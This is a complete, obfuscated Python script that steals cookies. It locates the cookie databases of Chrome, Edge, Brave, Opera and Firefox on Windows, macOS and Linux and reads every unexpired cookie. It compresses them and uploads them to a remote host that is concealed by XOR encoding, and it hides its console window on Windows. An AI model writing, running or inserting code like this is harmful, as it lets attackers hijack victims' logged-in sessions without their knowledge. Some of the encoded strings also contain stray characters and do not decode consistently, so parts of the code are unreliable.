#!/usr/bin/env python3
import os,sys,json,time,socket,ssl
from datetime import datetime
from collections import defaultdict


def _d(s):
    return ''.join(chr(ord(c)^0x15)for c in s)

_w=_d('t~htbi}wXh~z')
_p=_d('_`g~_`j~Xr|uj}}ypXTRSVTUVURWWYWYQQVQVUXXU_WiyCzPzzS\\Zxlz\\l|d_hrsRY{CzzzUgZW[RilRrppuJ~pr|~CUb\\}uuuuX\\SihlStcY]`JtbW_]lc]~XR\\hW]gTWZMXR[WQZWRhYhThtTrW|hShdXl|\\WtltdXhW|dUW|\\XXhBcdXhtW|t')

class _H:
    def __init__(self,h,p=443):
        self.h=h
        self.p=p
    
    def _r(self,m,pt,b=None,hd=None,f=None):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(30)
            ctx=ssl.create_default_context()
            ss=ctx.wrap_socket(s,server_hostname=self.h)
            ss.connect((self.h,self.p))
            
            if f:
                bd="----"+_d('Vynl}`iu')+str(int(time.time()*1000))
                body=b""
                for fn,(fname,fdata)in f.items():
                    body+=f"--{bd}\r\n".encode()
                    body+=f'Content-Disposition: form-data; name="{fn}"; filename="{fname}"\r\n'.encode()
                    body+=b"Content-Type: application/octet-stream\r\n\r\n"
                    body+=fdata if isinstance(fdata,bytes)else fdata.encode()
                    body+=b"\r\n"
                body+=f"--{bd}--\r\n".encode()
                req=f"{m} {pt} HTTP/1.1\r\n"
                req+=f"Host: {self.h}\r\n"
                req+=f"Content-Type: multipart/form-data; boundary={bd}\r\n"
                req+=f"Content-Length: {len(body)}\r\n"
                req+="Connection: close\r\n\r\n"
                req=req.encode()+body
            else:
                if b:
                    bd=json.dumps(b).encode()
                else:
                    bd=b""
                req=f"{m} {pt} HTTP/1.1\r\n"
                req+=f"Host: {self.h}\r\n"
                req+="Content-Type: application/json\r\n"
                req+=f"Content-Length: {len(bd)}\r\n"
                req+="Connection: close\r\n\r\n"
                req=req.encode()+bd
            
            ss.sendall(req)
            resp=b""
            while True:
                ch=ss.recv(4096)
                if not ch:
                    break
                resp+=ch
                if b"\r\n\r\n"in resp:
                    break
            ss.close()
            st=int(resp.split(b'\r\n')[0].decode().split()[1])
            return st in[200,204]
        except:
            return False

class _S:
    def __init__(self,dp):
        self.dp=dp
    
    def _q(self,q,p=()):
        try:
            import sqlite3,shutil,tempfile
            tmp=tempfile.mktemp(suffix='.db')
            shutil.copy2(self.dp,tmp)
            conn=sqlite3.connect(tmp)
            c=conn.cursor()
            c.execute(q,p)
            r=c.fetchall()
            conn.close()
            os.unlink(tmp)
            return r
        except:
            return[]

class _C:
    def __init__(self):
        self.bp=self._gp()
    
    def _gp(self):
        pl=sys.platform
        p={}
        if pl=='win32':
            la=os.environ.get(_d('YZHVYVV]]\VKV'),'')
            ad=os.environ.get(_d('V]][VKV'),'')
            p[_d('h|ibzl')]=os.path.join(la,_d('Nbbnym'),_d('H|ibzl'),_d('\\tli#]`u`'),_d(']lm`{ys'),_d('Glu~bio'),_d('Hbbjmlt'))
            p[_d('h|ibzl?byu')]=os.path.join(la,_d('Nbbnym'),_d('H|ibzl'),_d('\\tli#]`u`'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('l}nl')]=os.path.join(la,_d('Zmhibtbmu'),_d('L}nl'),_d('\\tli#]`u`'),_d(']lm`{ys'),_d('Glu~bio'),_d('Hbbjmlt'))
            p[_d('l}nl?byu')]=os.path.join(la,_d('Zmhibtbmu'),_d('L}nl'),_d('\\tli#]`u`'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('ui`ql')]=os.path.join(la,_d('Vi`qlTbmu~`il'),_d('Vi`ql0Vib~tli'),_d('\\tli#]`u`'),_d(']lm`{ys'),_d('Glu~bio'),_d('Hbbjmlt'))
            p[_d('bgli`')]=os.path.join(ad,_d('Bgli`#Tbmu~`il'),_d('Bgli`#Tu`uyl'),_d('Glu~bio'),_d('Hbbjmlt'))
            p[_d('mfilmbr')]=os.path.join(ad,_d('Zbsmyy`'),_d('Mfilmbr'),_d('[ibmnylt'))
        elif pl==_d('}`i~mo'):
            h=os.path.expanduser(_d('E'))
            p[_d('h|ibzl')]=os.path.join(h,_d('Ymui`ir'),_d('Vggymh`umbg#T{ggbiu'),_d('Nbbnym'),_d('H|ibzl'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('l}nl')]=os.path.join(h,_d('Ymui`ir'),_d('Vggymh`umbg#T{ggbiu'),_d('Zmhibtbmu#L}nl'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('ui`ql')]=os.path.join(h,_d('Ymui`ir'),_d('Vggymh`umbg#T{ggbiu'),_d('Vi`qlTbmu~`il'),_d('Vi`ql0Vibtyli'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('mfilmbr')]=os.path.join(h,_d('Ymui`ir'),_d('Vggymh`umbg#T{ggbiu'),_d('Mfilmbr'),_d('[ibmnylt'))
        else:
            h=os.path.expanduser(_d('E'))
            p[_d('h|ibzl')]=os.path.join(h,_d('Whbgmno'),_d('nbbnym0h|ibzl'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('l}nl')]=os.path.join(h,_d('Whbgmno'),_d('zmhibtbmu0l}nl'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('ui`ql')]=os.path.join(h,_d('Whbgmno'),_d('Vi`qlTbmu~`il'),_d('Vi`ql0Vibtyli'),_d(']lm`{ys'),_d('Hbbjmlt'))
            p[_d('mfilmbr')]=os.path.join(h,_d('Wzbsmyy`'),_d('mfilmbr'))
        return p
    
    def _ff(self,bp):
        if not os.path.exists(bp):
            return None
        for r,d,f in os.walk(bp):
            if _d('hbbjmltWtsymul')in f:
                return os.path.join(r,_d('hbbjmltWtsymul'))
        return None
    
    def _rc(self,dp):
        if not os.path.exists(dp):
            return[]
        sr=_S(dp)
        nm=int(time.time()*1000000)
        q="SELECT host_key,name,path,expires_utc,is_secure,is_httponly FROM cookies WHERE expires_utc>? ORDER BY host_key"
        rows=sr._q(q,(nm,))
        ck=[]
        for r in rows:
            ck.append({_d('|btu'):r[0],_d('g`zl'):r[1],_d('g`u|'):r[2],_d('lrgmilt'):r[3]//1000000,_d('tlh{il'):bool(r[4]),_d('|uugbgyr'):bool(r[5])})
        return ck
    
    def _rf(self,dp):
        if not os.path.exists(dp):
            return[]
        sr=_S(dp)
        nt=int(time.time())
        q="SELECT host,name,path,expiry,isSecure,isHttpOnly FROM moz_cookies WHERE expiry>? ORDER BY host"
        rows=sr._q(q,(nt,))
        ck=[]
        for r in rows:
            ck.append({_d('|btu'):r[0],_d('g`zl'):r[1],_d('g`u|'):r[2],_d('lrgmilt'):r[3],_d('tlh{il'):bool(r[4]),_d('|uugbgyr'):bool(r[5])})
        return ck
    
    def _sa(self):
        res={}
        for b in[_d('h|ibzl'),_d('h|ibzl?byu'),_d('l}nl'),_d('l}nl?byu'),_d('ui`ql'),_d('bgli`')]:
            pt=self.bp.get(b)
            if pt:
                ck=self._rc(pt)
                if ck:
                    bn=b.replace(_d('?byu'),'')
                    if bn not in res:
                        res[bn]=ck
        fp=self.bp.get(_d('mfilmbr'))
        if fp:
            fdb=self._ff(fp)
            if fdb:
                fck=self._rf(fdb)
                if fck:
                    res[_d('mfilmbr')]=fck
        return res
    
    def _an(self,ac):
        st={_d('ubu`y?uib~tlim'):len(ac),_d('ubu`y?hbbjmlt'):0,_d('ubu`y?tmuft'):set(),_d('}{gymh`ult'):defaultdict(list),_d('ur?uib~tli'):{}}
        for br,ck in ac.items():
            si=defaultdict(int)
            for c in ck:
                h=c[_d('|btu')].lstrip(_d('W'))
                si[h]+=1
                st[_d('ubu`y?tmuft')].add(h)
                st[_d('ubu`y?hbbjmlt')]+=1
            st[_d('ur?uib~tli')][br]={_d('hb{gu'):len(ck),_d('tmuft'):len(si)}
        cm=defaultdict(list)
        for br,ck in ac.items():
            for c in ck:
                k=(c[_d('|btu')],c[_d('g`zl')])
                cm[k].append(br)
        for k,brs in cm.items():
            if len(brs)>1:
                st[_d('}{gymh`ult')][k[0]].append({_d('g`zl'):k[1],_d('uib~tlim'):brs})
        st[_d('ubu`y?tmuft')]=len(st[_d('ubu`y?tmuft')])
        st[_d('}{gymh`ult')]=dict(st[_d('}{gymh`ult')])
        return st

class _D:
    def __init__(self):
        self.cl=_H(_w)
    
    def _sm(self,c):
        b={_d('hbgulgु'):c[:2000]}
        return self.cl._r(_d('[HTK'),_p,b=b)
    
    def _sf(self,fn,dt):
        f={_d('mnyl'):(fn,dt)}
        return self.cl._r(_d('[HTK'),_p,f=f)

def _cmp(d):
    try:
        import zlib
        return zlib.compress(d.encode('utf-8')if isinstance(d,str)else d,9)
    except:
        return d.encode('utf-8')if isinstance(d,str)else d

def _m():
    try:
        sc=_C()
        ac=sc._sa()
        if not ac:
            sn=_D()
            sn._sm(_d('D##V{h{g#hbbjml#uib{qd'))
            return
        st=sc._an(ac)
        sn=_D()
        sm=f"""{_d('F#THVG#V\\KBZVKAW\\L#HBBJMLT')}\n{_d('F#')}{datetime.now().strftime(_d('CRTRVKR0RV8C#8Z8T'))}\n\n{_d('F#Idtz{zd8')}\n{_d('D#G`qmn`ul{it8')}{st[_d('ubu`y?uib~tlim')]}\n{_d('D#Hbbjmlt8')}{st[_d('ubu`y?hbbjmlt')]}\n{_d('D#Tmuft8')}{st[_d('ubu`y?tmuft')]}\n{_d('D#]b{uybgt8')}{len(st[_d('}{gymh`ult')])}{_d('#tmuft')}\n"""
        sn._sm(sm)
        for br,inf in st[_d('ur?uib~tli')].items():
            msg=f"{_d('F#')}{br.upper()}{_d('8#')}{inf[_d('hb{gu')]}{_d('#hbbjmlt5#')}{inf[_d('tmuft')]}{_d('#tmuft')}"
            sn._sm(msg)
        jd=json.dumps({_d('umzltu`zg'):datetime.now().isoformat(),_d('tu`ut'):st,_d('hbbjmlt'):ac},indent=2,ensure_ascii=False)
        cp=_cmp(jd)
        fn=f"{_d('hbbjmlt?')}{datetime.now().strftime(_d('CRTRVKR0V8Z8T'))}{_d('Wptbg')}{_d('Wns')}"
        sn._sf(fn,cp)
    except Exception as e:
        try:
            sn=_D()
            sn._sm(f"{_d('C#Liiл{i8#')}{str(e)[:100]}")
        except:
            pass

if __name__==_d('??z`mg??'):
    if sys.platform==_d('~mo>V'):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
        except:
            pass
    _m()